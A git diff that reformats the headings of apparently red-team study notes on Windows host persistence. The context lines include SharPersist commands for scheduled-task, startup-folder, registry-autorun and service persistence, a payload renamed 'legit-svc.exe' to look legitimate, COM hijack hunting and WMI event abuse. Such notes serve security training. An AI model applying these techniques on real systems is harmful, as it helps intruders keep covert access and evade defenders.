@@ -1,6 +1,6 @@
 # Host Persistence Notes
 
-**Task Scheduler**
+## Task Scheduler
 
 Creating a scheduled task that will execute a PowerShell payload once every hour
 
@@ -24,7 +24,7 @@ Creating a scheduled task that will execute a PowerShell payload once every hour
     -m is to add the task (you can also remove, check and list).
     -o is the task frequency.
 
-**StartUp Folder**
+## StartUp Folder
 
 Things that start automatically when a user first logs in
 ```
@@ -32,7 +32,7 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 ```
 -f is the filename to save as
 
-**Registry Autorun**
+## Registry Autorun
 
 AutoRun values in HKCU and HKLM allow applications to start on boot. 
 
@@ -46,7 +46,7 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 -k is the registry key to modify.
 -v is the name of the registry key to create.
 
-**Hunting for COM Hijacks**
+## Hunting for COM Hijacks
 
 Easier to hunt for hijacks on our own machine first. Launch procmon64.exe from [sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
 
@@ -92,9 +92,9 @@ foreach ($Task in $Tasks)
 ```
 Review this list for possible exploitation parts by rechecking the HKCU and HKLM like above, and how often they are ran, lik at every user login or something of that nature
 
-## Elevated Host persistence
+# Elevated Host persistence
 
-**Windows Services**
+## Windows Services
 
 Create a new service as an elevated system, this will only run when the system is rebooted
 ```
@@ -104,7 +104,7 @@ mv tcp-local_x64.svc.exe legit-svc.exe
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
 ```
 
-**WMI Event Subscriptions**
+## WMI Event Subscriptions
 
 Can abuse one of these in WMI
 -EventConsumer
